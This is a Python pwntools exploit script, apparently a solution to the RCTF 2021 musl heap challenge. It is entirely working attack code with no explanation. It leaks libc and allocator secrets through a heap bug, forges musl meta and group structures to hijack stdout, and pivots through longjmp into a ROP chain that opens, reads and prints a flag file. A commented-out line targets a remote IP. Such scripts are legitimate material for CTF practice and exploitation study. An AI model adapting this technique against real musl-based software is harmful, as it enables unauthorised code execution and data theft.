from pwn import *
from pwnlib.util import getdents

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('r')
# io = remote('123.60.25.24', 12345)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
elf = ELF('r')


def add(index, size, content):
    io.sendlineafter('>>', '1')
    io.sendlineafter('idx?\n', str(index))
    io.sendlineafter('size?\n', str(size))
    io.sendafter('Contnet?\n', content)


def delete(index):
    io.sendlineafter('>>', '2')
    io.sendlineafter('idx?\n', str(index))


def show(index):
    io.sendlineafter('>>', '3')
    io.sendlineafter('idx?\n', str(index))
    io.recvuntil('Content: ')


def pwn():
    for _ in range(15):
        add(1, 0xc, 'a' * 0xb)
    add(0, 0xc, 'a' * 0xb)
    add(1, 0xc, 'b' * 0xb)
    delete(0)
    for _ in range(13):
        add(2, 0xc, 'A' * 0xb)
        delete(2)
    add(0, 0, 'a' * 0xf + '\n')
    show(0)
    io.recvuntil('a' * 0xf + '\n')
    libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x298d50
    log.success('libc_base: ' + hex(libc_base))
    __malloc_context = libc_base + libc.sym['__malloc_context']
    __stdout_used = libc_base + libc.sym['__stdout_used']
    longjmp = libc_base + libc.sym['longjmp']
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    getdents = libc_base + libc.sym['getdents']
    ret = libc_base + 0x0000000000000598
    pop_rdi_ret = libc_base + 0x0000000000014b82
    pop_rsi_ret = libc_base + 0x000000000001b27a
    pop_rdx_ret = libc_base + 0x0000000000009328
    add(0, 0xc, 'c' * 0xb)
    add(1, 0xc, 'c' * 0xb)
    delete(0)
    for _ in range(11):
        add(2, 0xc, 'A' * 0xb)
        delete(2)
    add(0, 0, b'a' * 0x10 + p64(__malloc_context) + b'\n')
    show(1)
    secret = u64(io.recv(8))
    log.success('secret: ' + hex(secret))

    add(2, 0x1200, b'\n')
    mmap_base = libc_base + 0x290000
    fake_meta_area_addr = mmap_base + 0x2000
    fake_meta_addr = mmap_base + 0x2010
    fake_group_addr = mmap_base + 0x2040
    fake_meta_area = p64(secret) + p64(0)
    last_idx, freeable, sc, maplen = 0, 1, 8, 1     # 0x90
    fake_meta  = p64(__stdout_used - 0x8)           # prev
    fake_meta += p64(fake_meta_addr + 0x30)         # next
    fake_meta += p64(fake_group_addr)               # mem
    fake_meta += p32(0) * 2                         # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_group  = p64(fake_meta_addr)               # meta
    fake_group += p64(1)                            # active_idx + pad
    padding = b'a' * 0xaa0
    payload = padding + fake_meta_area + fake_meta + fake_group + b'\n'
    add(2, 0x1200, payload)
    delete(2)
    add(0, 0xc, 'd' * 0xb)
    add(1, 0xc, 'd' * 0xb)
    delete(0)
    for _ in range(8):
        add(2, 0xc, 'A' * 0xb)
        delete(2)
    add(2, 0x1c, '\n')
    add(0, 0, b'a' * 0xc + b'\x00' + p8(0xc) + p16(0xc) + p64(fake_group_addr + 0x10) + b'\n')
    delete(1)

    buf = mmap_base + 0x1000
    # filename = b'/mnt/hgfs/payoung/Documents/ctf/CTF_WriteUp/musl_libc/RCTF_2021_musl/attachment/'
    filename = b'/mnt/hgfs/payoung/Documents/ctf/CTF_WriteUp/musl_libc/RCTF_2021_musl/attachment/flag'
    filename_addr = mmap_base + 0x1570
    ropchain_addr = mmap_base + 0x20e0
    # ropchain = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    # ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x100) + p64(getdents)
    # ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x100) + p64(write)
    ropchain = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x100) + p64(read)
    ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x100) + p64(write)
    fake_IO  = p64(0x45)                            # flags
    fake_IO += p64(0)                               # rpos
    fake_IO += p64(0)                               # rend
    fake_IO += p64(libc_base + 0x4b9f0)             # close
    fake_IO += p64(0)                               # wend
    fake_IO += p64(0)                               # wpos
    fake_IO += p64(ropchain_addr)                   # mustbezero_1  / rsp
    fake_IO += p64(ret)                             # wbase         / rip
    fake_IO += p64(0)                               # read
    fake_IO += p64(longjmp + 0x1e)                  # write
    padding = b'a' * (0xa90 + 0x40)  
    payload = (filename.ljust(0x100, b'\x00')).ljust(0xa90 + 0x40, b'\x00') + fake_IO.ljust(0xa0, b'\x00') + ropchain + b'\n'
    add(2, 0x1200, payload)
    
    # gdb.attach(io)
    io.sendlineafter('>>', '4')
    # pause()
    flag = io.recv().decode()
    log.success(flag)


if __name__ == '__main__':
    pwn()

